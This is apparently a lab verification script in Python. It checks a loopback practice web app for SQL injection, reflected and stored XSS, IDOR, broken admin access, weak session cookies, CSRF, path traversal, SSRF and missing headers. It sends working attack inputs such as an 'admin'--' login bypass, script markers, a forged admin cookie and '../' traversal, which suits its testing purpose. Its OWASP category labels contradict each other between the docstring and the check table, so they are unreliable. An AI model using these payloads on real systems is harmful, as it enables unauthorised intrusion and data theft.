#!/usr/bin/env python3
"""
findings.py - controlled verification of each weakness class on the lab target.

For the AUTHORISED loopback lab only. Each check uses the MINIMUM safe proof
needed to confirm whether a weakness is present, and records the result. It
makes no change it cannot undo and attacks nothing outside the owned target.

Checks (OWASP Top 10:2025 / CWE):
  sqli         SQL injection in /login        A03 / CWE-89
  xss_refl     reflected XSS in /search       A03 / CWE-79
  xss_stored   stored XSS in /reviews         A03 / CWE-79
  idor         IDOR in /account               A01 / CWE-639
  authz_admin  broken access control /admin   A01 / CWE-284
  session      weak session cookie flags      A07 / CWE-1004/CWE-384
  csrf         missing CSRF token on POST      A01 / CWE-352
  traversal    path traversal in /download    A05 / CWE-22
  ssrf         SSRF in /fetch                  A10 / CWE-918
  headers      missing security headers       A05 / CWE-693

Usage: python findings.py [--port 8200]   (8200 vulnerable, 8201 hardened)
"""
import argparse
import json
import os
from labutil import get, post

SEC_HEADERS = ["x-content-type-options", "content-security-policy",
               "x-frame-options", "referrer-policy"]


def check_sqli(host, port):
    # Classic auth-bypass tautology. A fixed app returns 401; a vulnerable one
    # logs in because the injected OR makes the WHERE clause always true.
    inj = "/login?user=" + "admin'--" + "&pw=x"
    st, _, body = get(host, port, inj)
    present = (st == 200 and "Welcome" in body)
    return present, "login with admin'-- returned %s" % ("a session" if present
                                                          else "no session")


def check_xss_reflected(host, port):
    marker = "<script>rk1</script>"
    st, _, body = get(host, port, "/search?q=" + marker)
    present = marker in body  # unencoded reflection
    return present, "search reflected the marker %sencoded" % ("un" if present else "")


def check_xss_stored(host, port):
    marker = "<script>rk2</script>"
    post(host, port, "/reviews/add", {"book": "XSSBook", "body": marker},
         headers={"Cookie": "session=YXNoYQ=="})
    st, _, body = get(host, port, "/reviews?book=XSSBook")
    present = marker in body
    return present, "stored review rendered %sencoded" % ("un" if present else "")


def check_idor(host, port):
    # Log in as asha, then request ravi's order 1002.
    st, hdrs, _ = get(host, port, "/login?user=asha&pw=reader123")
    cookie = hdrs.get("set-cookie", "").split(";")[0] or "session=YXNoYQ=="
    st, _, body = get(host, port, "/account?id=1002", headers={"Cookie": cookie})
    present = (st == 200 and "ravi" in body.lower())
    return present, "asha could read order 1002 (ravi): %s" % present


def check_authz_admin(host, port):
    # Try /admin with only a forged role cookie, no admin session.
    st, _, body = get(host, port, "/admin", headers={"Cookie": "role=admin"})
    present = (st == 200 and "all users" in body.lower())
    return present, "/admin reachable with forged role cookie: %s" % present


def check_session(host, port):
    st, hdrs, _ = get(host, port, "/login?user=asha&pw=reader123")
    sc = hdrs.get("set-cookie", "")
    weak = ("httponly" not in sc.lower()) or ("samesite" not in sc.lower())
    return weak, "Set-Cookie=%r" % sc


def check_csrf(host, port):
    # POST an email change with a valid session but no CSRF token.
    st, hdrs, _ = get(host, port, "/login?user=asha&pw=reader123")
    cookie = hdrs.get("set-cookie", "").split(";")[0] or "session=YXNoYQ=="
    st, _, body = post(host, port, "/account/update", {"email": "x@evil.test"},
                       headers={"Cookie": cookie})
    accepted = (st == 200 and "updated" in body.lower())
    return accepted, "state change without CSRF token accepted: %s" % accepted


def check_traversal(host, port):
    st, _, body = get(host, port, "/download?file=" + "../app.py")
    present = ("build_db" in body or "do_GET" in body or "VULN" in body)
    return present, "../ escaped the download directory: %s" % present


def check_ssrf(host, port):
    # Canonical SSRF proof: stand up a throwaway loopback listener, ask the
    # target to fetch it, and confirm the TARGET connected to a URL we chose.
    # All traffic stays on loopback. A fixed app refuses (empty allowlist).
    import socket
    import threading
    import urllib.parse
    hit = {"connected": False}
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.bind(("127.0.0.1", 0))
    srv.listen(1)
    srv.settimeout(4)
    probe_port = srv.getsockname()[1]

    def accept_once():
        try:
            conn, _ = srv.accept()
            hit["connected"] = True
            try:
                conn.recv(64)
                conn.sendall(b"HTTP/1.0 200 OK\r\nContent-Length: 2\r\n\r\nok")
            finally:
                conn.close()
        except Exception:
            pass
    t = threading.Thread(target=accept_once, daemon=True)
    t.start()
    url = "http://127.0.0.1:%d/ssrf-probe" % probe_port
    try:
        get(host, port, "/fetch?url=" + urllib.parse.quote(url, safe=""))
    except Exception:
        pass
    t.join(timeout=5)
    srv.close()
    return hit["connected"], ("target connected to our chosen URL: %s"
                              % hit["connected"])


def check_headers(host, port):
    st, hdrs, _ = get(host, port, "/")
    missing = [h for h in SEC_HEADERS if h not in hdrs]
    return bool(missing), "missing security headers: %s" % (missing or "none")


CHECKS = [
    ("sqli", "SQL injection (login)", "A05:2025 Injection", "CWE-89",
     "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", check_sqli),
    ("xss_refl", "Reflected XSS (search)", "A05:2025 Injection", "CWE-79",
     "AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", check_xss_reflected),
    ("xss_stored", "Stored XSS (reviews)", "A05:2025 Injection", "CWE-79",
     "AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N", check_xss_stored),
    ("idor", "IDOR (other user's order)", "A01:2025 Broken Access Control",
     "CWE-639", "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N", check_idor),
    ("authz_admin", "Broken access control (/admin)",
     "A01:2025 Broken Access Control", "CWE-284",
     "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N", check_authz_admin),
    ("session", "Weak session cookie", "A07:2025 Authentication Failures",
     "CWE-1004", "AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N", check_session),
    ("csrf", "Cross-site request forgery", "A01:2025 Broken Access Control",
     "CWE-352", "AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N", check_csrf),
    ("traversal", "Path traversal (download)",
     "A01:2025 Broken Access Control", "CWE-22",
     "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", check_traversal),
    ("ssrf", "Server-side request forgery (A01: CWE-918)",
     "A01:2025 Broken Access Control", "CWE-918",
     "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", check_ssrf),
    ("headers", "Missing security headers",
     "A02:2025 Security Misconfiguration", "CWE-693",
     "AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N", check_headers),
]


def run(host, port):
    results = []
    for cid, title, owasp, cwe, vector, fn in CHECKS:
        try:
            present, evidence = fn(host, port)
        except Exception as exc:
            present, evidence = None, "check error: %r" % exc
        results.append({"id": cid, "title": title, "owasp": owasp, "cwe": cwe,
                        "cvss_vector": vector, "present": present,
                        "evidence": evidence})
    return results


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8200)
    ap.add_argument("--save", action="store_true")
    args = ap.parse_args()
    results = run(args.host, args.port)
    print("Findings against http://%s:%d" % (args.host, args.port))
    for r in results:
        flag = {True: "PRESENT", False: "absent", None: "error"}[r["present"]]
        print("  [%-7s] %-32s %-10s %s" % (flag, r["title"], r["cwe"],
                                           r["evidence"][:40]))
    present = [r for r in results if r["present"]]
    print("\n%d of %d weaknesses present." % (len(present), len(results)))
    if args.save:
        out = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                           "data", "findings.json")
        with open(out, "w") as fh:
            json.dump(results, fh, indent=2)
        print("Saved %s" % out)


if __name__ == "__main__":
    main()
